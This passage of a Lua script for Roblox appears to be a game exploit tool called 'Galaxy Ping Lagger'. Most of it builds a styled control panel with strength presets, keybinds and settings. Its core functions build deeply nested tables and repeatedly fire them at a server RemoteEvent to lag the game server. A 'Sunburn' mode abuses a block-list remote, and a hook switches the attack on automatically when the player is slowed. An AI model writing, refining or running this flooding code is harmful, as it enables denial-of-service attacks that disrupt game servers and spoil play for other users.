local resetBtn = Instance.new("TextButton", scroll)
resetBtn.Size = UDim2.new(1, -4, 0, 32)
resetBtn.BackgroundColor3 = C.purple1
resetBtn.BorderSizePixel = 0
resetBtn.Text = "Reset All"
resetBtn.TextColor3 = C.white
resetBtn.Font = Enum.Font.GothamBold
resetBtn.TextSize = 12
resetBtn.AutoButtonColor = false
resetBtn.LayoutOrder = 17
resetBtn.ZIndex = 32
corner(resetBtn, 9)
grad(resetBtn, C.purple1, C.purple2, 135)

-- ============================================================
-- STRENGTH POPUP
-- ============================================================
local strengthPanel = Instance.new("Frame")
strengthPanel.Name = "StrengthPanel"
strengthPanel.Size = UDim2.fromOffset(180, 280)
strengthPanel.Position = UDim2.new(0.5, -90, 0.5, -140)
strengthPanel.BackgroundColor3 = C.panel
strengthPanel.BorderSizePixel = 0
strengthPanel.Visible = false
strengthPanel.ZIndex = 50
strengthPanel.Parent = screen
corner(strengthPanel, 12)
stroke(strengthPanel, C.purple2, 1.3, 0.25)
grad(strengthPanel, C.panel, Color3.fromRGB(16, 10, 34), 150)

local spTitle = Instance.new("TextLabel", strengthPanel)
spTitle.Size = UDim2.new(1, -30, 0, 28)
spTitle.Position = UDim2.fromOffset(10, 4)
spTitle.BackgroundTransparency = 1
spTitle.Text = "Select Strength"
spTitle.TextColor3 = C.white
spTitle.Font = Enum.Font.GothamBold
spTitle.TextSize = 12
spTitle.TextXAlignment = Enum.TextXAlignment.Left
spTitle.ZIndex = 51

local spClose = Instance.new("TextButton", strengthPanel)
spClose.Size = UDim2.fromOffset(22, 22)
spClose.Position = UDim2.new(1, -28, 0, 6)
spClose.BackgroundColor3 = Color3.fromRGB(40, 18, 70)
spClose.Text = "X"
spClose.TextColor3 = C.white
spClose.Font = Enum.Font.GothamBold
spClose.TextSize = 11
spClose.AutoButtonColor = false
spClose.ZIndex = 51
corner(spClose, 6)

local spList = Instance.new("Frame", strengthPanel)
spList.Size = UDim2.new(1, -16, 1, -40)
spList.Position = UDim2.fromOffset(8, 34)
spList.BackgroundTransparency = 1
spList.ZIndex = 51
local spLayout = Instance.new("UIListLayout", spList)
spLayout.Padding = UDim.new(0, 5)

local strengthColors = {
    ["Ultra Weak"]   = Color3.fromRGB(160, 160, 200),
    ["Extra Weak"]   = Color3.fromRGB(170, 150, 220),
    ["Weak"]         = Color3.fromRGB(180, 140, 240),
    ["Normal"]       = C.white,
    ["Strong"]       = Color3.fromRGB(255, 200, 100),
    ["Extra Strong"] = Color3.fromRGB(255, 160, 80),
    ["Ultra Strong"] = Color3.fromRGB(255, 120, 80),
}

-- ============================================================
-- LOGIC
-- ============================================================
local active = false
local brainrotMode, lastBrainrotState, manualOverride = false, false, false
local settingsOpen, strengthOpen = false, false
local listeningFor = nil
local remote = findRemote()
local lagGen = 0

local function buildPayload(power)
    local mainT = {}
    local nested = {{}}
    local current = nested[1]
    for _ = 1, 186 do
        local n = {}
        table.insert(current, n)
        current = n
    end
    local maxRep = math.min(math.floor(power / 188), 10000)
    for _ = 1, maxRep do
        table.insert(mainT, nested)
    end
    return mainT
end

local function setUIActive(on)
    if on then
        actGrad.Color = ColorSequence.new({
            ColorSequenceKeypoint.new(0, C.purple2),
            ColorSequenceKeypoint.new(1, C.purple3),
        })
        activateLbl.Text = "ACTIVATED"
        actStroke.Color = C.white
        actStroke.Transparency = 0
        statusLbl.Text = cfg.mode == "Sunburn" and "ON·S" or "ON·G"
        statusLbl.TextColor3 = C.green
        tw(statusPill, {BackgroundColor3 = Color3.fromRGB(16, 50, 30)}, 0.15)
    else
        actGrad.Color = ColorSequence.new({
            ColorSequenceKeypoint.new(0, C.purple1),
            ColorSequenceKeypoint.new(1, C.purple2),
        })
        activateLbl.Text = "ACTIVATE"
        actStroke.Color = C.purple3
        actStroke.Transparency = 0.4
        statusLbl.Text = "OFF"
        statusLbl.TextColor3 = C.red
        tw(statusPill, {BackgroundColor3 = Color3.fromRGB(50, 16, 40)}, 0.15)
    end
end

-- ✅ Fixed: generation counter prevents stale loops
local function runPingLoop(gen)
    local delay = cfg.interval
    while active and remote and cfg.mode == "Galaxy" and gen == lagGen do
        local payload = buildPayload(cfg.power)
        local ok = pcall(function() remote:FireServer(payload) end)
        if not ok then
            delay = math.min(delay * 1.5, 0.5)
        else
            delay = math.max(delay * 0.995, 0.04)
        end
        task.wait(delay)
    end
end

local function flipLag(state, isManual)
    if isManual then
        if brainrotMode then
            manualOverride = not state
        else
            manualOverride = false
        end
    end

    if state then
        if cfg.mode == "Sunburn" then
            if not api then
                warn("[Galaxy] Sunburn module unavailable")
                active = false
                setUIActive(false)
                return
            end
            api.setConfig({
                Children       = cfg.sbChildren,
                FrameDelay     = cfg.sbFrameDelay,
                FireBurst      = cfg.sbFireBurst,
                FieldSize      = cfg.sbFieldSize,
                NestedPerChild = cfg.sbNestedPerChild,
                FieldsPerChild = cfg.sbFieldsPerChild,
                RebuildEach    = cfg.sbRebuildEach,
            })
            local ok = api.start()
            if not ok then
                warn("[Galaxy] Sunburn: SetPlayerBlockList not found")
                active = false
                setUIActive(false)
                return
            end
            active = true
            setUIActive(true)
        else
            if not remote then remote = findRemote() end
            if not remote then
                active = false
                setUIActive(false)
                return
            end
            active = true
            setUIActive(true)
            lagGen = lagGen + 1
            task.spawn(runPingLoop, lagGen)
        end
    else
        active = false
        if api and api.isRunning() then pcall(api.stop) end
        setUIActive(false)
    end
end

local function applyStrength(name)
    for _, s in ipairs(STRENGTHS) do
        if s.name == name then
            cfg.strength = name
            cfg.power = s.power
            powerBox.Text = tostring(cfg.power)
            strengthBtn.Text = name
            saveConfig()
            return
        end
    end
end

local function applyPreset(name)
    local p = PRESETS[name]
    if not p then return end
    cfg.power = p.power
    cfg.interval = p.interval
    powerBox.Text = tostring(cfg.power)
    delayBox.Text = tostring(cfg.interval)
    local best, bestDiff = "Normal", math.huge
    for _, s in ipairs(STRENGTHS) do
        local d = math.abs(s.power - p.power)
        if d < bestDiff then bestDiff, best = d, s.name end
    end
    cfg.strength = best
    strengthBtn.Text = best
    for n, b in pairs(presetBtns) do
        if n == name then
            b.BackgroundColor3 = C.purple1
            b.TextColor3 = C.white
        else
            b.BackgroundColor3 = C.card
            b.TextColor3 = C.dim
        end
    end
    saveConfig()
end

local function updateModeUI()
    local g = cfg.mode == "Galaxy"
    tw(modeGalaxy, {
        BackgroundColor3 = g and C.purple1 or C.card,
        TextColor3 = g and C.white or C.dim,
    }, 0.1)
    tw(modeSunburn, {
        BackgroundColor3 = (not g) and C.purple1 or C.card,
        TextColor3 = (not g) and C.white or C.dim,
    }, 0.1)
end

local function setMode(name)
    if cfg.mode == name then return end
    if name == "Sunburn" and not api then
        warn("[Galaxy] Cannot switch to Sunburn: module not loaded")
        return
    end
    local wasActive = active
    if wasActive then flipLag(false, false) end
    cfg.mode = name
    saveConfig()
    updateModeUI()
    if wasActive then flipLag(true, false) end
end

-- ============================================================
-- BINDINGS
-- ============================================================
bindTap(activateBtn, function() flipLag(not active, true) end)

for name, b in pairs(presetBtns) do
    bindTap(b, function() applyPreset(name) end)
end

bindTap(lockBtn, function()
    cfg.locked = not cfg.locked
    lockBtn.Text = cfg.locked and "🔒" or "🔓"
    saveConfig()
end)

bindTap(modeGalaxy, function() setMode("Galaxy") end)
bindTap(modeSunburn, function() setMode("Sunburn") end)

local function refreshSunburnFields()
    sbChildrenBox.Text   = tostring(cfg.sbChildren)
    sbFrameDelayBox.Text = tostring(cfg.sbFrameDelay)
    sbFireBurstBox.Text  = tostring(cfg.sbFireBurst)
    sbFieldSizeBox.Text  = tostring(cfg.sbFieldSize)
    sbNestedBox.Text     = tostring(cfg.sbNestedPerChild)
    sbFieldsBox.Text     = tostring(cfg.sbFieldsPerChild)
    sbRebuildBtn.Text    = cfg.sbRebuildEach and "ON" or "OFF"
    sbRebuildBtn.BackgroundColor3 = cfg.sbRebuildEach and C.green or Color3.fromRGB(70, 25, 40)
end

local function openSettings()
    settingsOpen = true
    settings.Visible = true
    settings.Size = UDim2.fromOffset(SET_W, 0)
    tw(settings, {Size = UDim2.fromOffset(SET_W, SET_H)}, 0.2, Enum.EasingStyle.Back)
    powerBox.Text = tostring(cfg.power)
    delayBox.Text = tostring(cfg.interval)
    strengthBtn.Text = cfg.strength
    brBtn.Text = cfg.autoBrainrot and "ON" or "OFF"
    brBtn.BackgroundColor3 = cfg.autoBrainrot and C.green or Color3.fromRGB(70, 25, 40)
    scaleLbl.Text = string.format("%.1f", cfg.uiScale)
    kbBind.Text = cfg.keybindKb
    gpBind.Text = cfg.keybindGp
    refreshSunburnFields()
end

local function closeSettings()
    settingsOpen = false
    listeningFor = nil
    tw(settings, {Size = UDim2.fromOffset(SET_W, 0)}, 0.15)
    task.delay(0.16, function() settings.Visible = false end)
    strengthPanel.Visible = false
    strengthOpen = false
end

bindTap(settingsBtn, function()
    if settingsOpen then closeSettings() else openSettings() end
end)
bindTap(setClose, closeSettings)

bindTap(strengthBtn, function()
    strengthOpen = not strengthOpen
    strengthPanel.Visible = strengthOpen
end)
bindTap(spClose, function()
    strengthPanel.Visible = false
    strengthOpen = false
end)

powerBox.FocusLost:Connect(function()
    local n = tonumber(powerBox.Text)
    if n and n >= 1 then
        cfg.power = math.floor(n)
        powerBox.Text = tostring(cfg.power)
        saveConfig()
    else
        powerBox.Text = tostring(cfg.power)
    end
end)

delayBox.FocusLost:Connect(function()
    local n = tonumber(delayBox.Text)
    if n and n >= 0.01 then
        cfg.interval = n
        delayBox.Text = tostring(cfg.interval)
        saveConfig()
    else
        delayBox.Text = tostring(cfg.interval)
    end
end)

bindTap(brBtn, function()
    cfg.autoBrainrot = not cfg.autoBrainrot
    brBtn.Text = cfg.autoBrainrot and "ON" or "OFF"
    tw(brBtn, {BackgroundColor3 = cfg.autoBrainrot and C.green or Color3.fromRGB(70, 25, 40)}, 0.12)
    saveConfig()
end)

bindTap(sbRebuildBtn, function()
    cfg.sbRebuildEach = not cfg.sbRebuildEach
    sbRebuildBtn.Text = cfg.sbRebuildEach and "ON" or "OFF"
    tw(sbRebuildBtn, {BackgroundColor3 = cfg.sbRebuildEach and C.green or Color3.fromRGB(70, 25, 40)}, 0.12)
    saveConfig()
end)

local function setScale(v)
    cfg.uiScale = math.clamp(math.floor(v * 10 + 0.5) / 10, 0.5, 1.8)
    rootScale.Scale = cfg.uiScale
    scaleLbl.Text = string.format("%.1f", cfg.uiScale)
    saveConfig()
end
bindTap(scaleMinus, function() setScale(cfg.uiScale - 0.1) end)
bindTap(scalePlus, function() setScale(cfg.uiScale + 0.1) end)

local function updateBindLabels()
    kbBind.Text = (listeningFor == "kb") and "..." or cfg.keybindKb
    kbBind.TextColor3 = (listeningFor == "kb") and C.waiting or C.purple3
    gpBind.Text = (listeningFor == "gp") and "..." or cfg.keybindGp
    gpBind.TextColor3 = (listeningFor == "gp") and C.waiting or C.purple3
end

kbBind.MouseButton1Click:Connect(function()
    listeningFor = (listeningFor == "kb") and nil or "kb"
    updateBindLabels()
end)
gpBind.MouseButton1Click:Connect(function()
    listeningFor = (listeningFor == "gp") and nil or "gp"
    updateBindLabels()
end)
kbClear.MouseButton1Click:Connect(function()
    cfg.keybindKb = "None"
    listeningFor = nil
    updateBindLabels()
    saveConfig()
end)
gpClear.MouseButton1Click:Connect(function()
    cfg.keybindGp = "None"
    listeningFor = nil
    updateBindLabels()
    saveConfig()
end)

bindTap(resetBtn, function()
    for k, v in pairs(DEFAULT_CFG) do
        if k ~= "posX" and k ~= "posY" and k ~= "locked" then
            cfg[k] = v
        end
    end
    powerBox.Text = tostring(cfg.power)
    delayBox.Text = tostring(cfg.interval)
    strengthBtn.Text = cfg.strength
    brBtn.Text = cfg.autoBrainrot and "ON" or "OFF"
    brBtn.BackgroundColor3 = cfg.autoBrainrot and C.green or Color3.fromRGB(70, 25, 40)
    setScale(cfg.uiScale)
    updateBindLabels()
    refreshSunburnFields()
    updateModeUI()
    saveConfig()
end)

-- Strength popup buttons
for _, s in ipairs(STRENGTHS) do
    local b = Instance.new("TextButton", spList)
    b.Size = UDim2.new(1, 0, 0, 30)
    b.BackgroundColor3 = C.card
    b.BorderSizePixel = 0
    b.Text = s.name
    b.TextColor3 = strengthColors[s.name] or C.white
    b.Font = Enum.Font.GothamBold
    b.TextSize = 12
    b.AutoButtonColor = false
    b.ZIndex = 52
    corner(b, 8)
    bindTap(b, function()
        applyStrength(s.name)
        strengthPanel.Visible = false
        strengthOpen = false
    end)
    b.MouseEnter:Connect(function() tw(b, {BackgroundColor3 = Color3.fromRGB(40, 28, 70)}, 0.1) end)
    b.MouseLeave:Connect(function() tw(b, {BackgroundColor3 = C.card}, 0.1) end)
end

-- ============================================================
-- AUTO BRAINROT
-- ============================================================
RunService.Heartbeat:Connect(function()
    if not cfg.autoBrainrot then
        if brainrotMode then
            brainrotMode = false
            lastBrainrotState = false
        end
        return
    end
    local char = plr.Character
    local hum = char and char:FindFirstChildOfClass("Humanoid")
    if not hum then return end
    local hasBrainrot = hum.WalkSpeed < 25
    if hasBrainrot and not lastBrainrotState then
        brainrotMode = true
        lastBrainrotState = true
        manualOverride = false
        if not active then flipLag(true, false) end
    elseif not hasBrainrot and lastBrainrotState then
        brainrotMode = false
        lastBrainrotState = false
        manualOverride = false
        if active then flipLag(false, false) end
    end
end)

-- ============================================================
-- INPUT
-- ============================================================
local BLACKLISTED = {
    [Enum.KeyCode.Escape] = true,
    [Enum.KeyCode.LeftControl] = true,
    [Enum.KeyCode.Unknown] = true,
}

UserInputService.InputBegan:Connect(function(input, processed)
    local kc = input.KeyCode
    if kc == Enum.KeyCode.Unknown then return end
    local isGp = isGamepad(kc)
    local isKb = input.UserInputType == Enum.UserInputType.Keyboard

    if listeningFor then
        if kc == Enum.KeyCode.Escape then
            listeningFor = nil
            updateBindLabels()
            return
        end
        if listeningFor == "kb" and isKb and not BLACKLISTED[kc] then
            cfg.keybindKb = kc.Name
            listeningFor = nil
            updateBindLabels()
            saveConfig()
            return
        end
        if listeningFor == "gp" and isGp then
            cfg.keybindGp = kc.Name
            listeningFor = nil
            updateBindLabels()
            saveConfig()
            return
        end
        return
    end

    if processed then return end

    if kc == Enum.KeyCode.LeftControl then
        main.Visible = not main.Visible
        if not main.Visible then closeSettings() end
        return
    end

    local kbEnum = resolveKb(cfg.keybindKb)
    local gpEnum = resolveKb(cfg.keybindGp)
    if (kbEnum and kc == kbEnum and isKb) or (gpEnum and kc == gpEnum and isGp) then
        flipLag(not active, true)
    end
end)

-- ============================================================
-- REOPEN PILL
-- ============================================================
local pill = Instance.new("TextButton")
pill.Name = "GalaxyReopen"
pill.Size = UDim2.fromOffset(130, 36)
pill.Position = UDim2.new(0.5, -65, 1, -90)
pill.BackgroundColor3 = C.bg
pill.BorderSizePixel = 0
pill.Text = "Galaxy Lagger"
pill.TextColor3 = C.purple3
pill.Font = Enum.Font.GothamBlack
pill.TextSize = 12
pill.Visible = false
pill.ZIndex = 100
pill.Parent = screen
corner(pill, 12)
stroke(pill, C.purple2, 1.3, 0.3)

pill.MouseButton1Click:Connect(function()
    main.Visible = true
    pill.Visible = false
    main.Position = UDim2.new(0.5, -MAIN_W/2, 0.5, -MAIN_H/2)
end)

main:GetPropertyChangedSignal("Visible"):Connect(function()
    pill.Visible = not main.Visible
end)

-- ============================================================
-- CLEANUP
-- ============================================================
_G.__GalaxyCleanup = function()
    if api and api.isRunning() then pcall(api.stop) end
    active = false
    if pill then pcall(function() pill:Destroy() end) end
    if screen then pcall(function() screen:Destroy() end) end
end

screen.Destroying:Connect(function()
    if api and api.isRunning() then pcall(api.stop) end
    active = false
end)

-- ============================================================
-- INIT
-- ============================================================
updateModeUI()
updateBindLabels()

print("[Galaxy Ping Lagger + Sunburn] loaded")
print("  · Mode:", cfg.mode)
print("  · Sunburn module:", api and "loaded ✓" or "FAILED ✗")
print("  · Remote found:", remote and remote.Name or "none (will resolve on activate)")
